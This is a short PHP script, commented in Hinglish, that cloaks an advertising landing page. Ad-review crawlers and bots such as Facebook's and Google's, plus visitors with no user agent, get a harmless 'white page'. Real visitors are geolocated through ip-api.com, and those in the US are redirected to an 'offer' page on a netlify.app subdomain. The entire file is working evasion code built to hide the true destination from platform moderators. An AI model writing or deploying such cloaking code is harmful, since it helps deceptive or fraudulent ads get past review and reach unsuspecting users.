<?php
error_reporting(0);
ini_set('display_errors', 0);

// Apna offer link
$offer = "https://grand-panda-280ba1.netlify.app/";

// Allowed countries — jahan offer dikhana hai
$allowed = ['US'];

// IP lena
$ip = '';
if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
    $ip = trim($_SERVER['HTTP_CF_CONNECTING_IP']);
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = trim(explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0]);
} elseif (!empty($_SERVER['REMOTE_ADDR'])) {
    $ip = trim($_SERVER['REMOTE_ADDR']);
}

// Bot check
$ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
$bots = ['facebookexternalhit','facebot','googlebot','bingbot','bot','crawler','spider','curl','wget','python'];
$isBot = false;
foreach ($bots as $b) {
    if (strpos($ua, $b) !== false) {
        $isBot = true;
        break;
    }
}

// Bot ko white page
if ($isBot || empty($ua)) {
    include 'site.html';
    exit;
}

// Country check
$country = 'XX';
$ctx = stream_context_create(['http' => ['timeout' => 5]]);
$res = @file_get_contents("http://ip-api.com/json/{$ip}?fields=countryCode", false, $ctx);
if ($res) {
    $data = json_decode($res, true);
    $country = $data['countryCode'] ?? 'XX';
}

// Allowed country — offer page
if (in_array($country, $allowed)) {
    header("Location: " . $offer, true, 302);
    exit;
}

// Baaki sab — white page
include 'site.html';
exit;
?>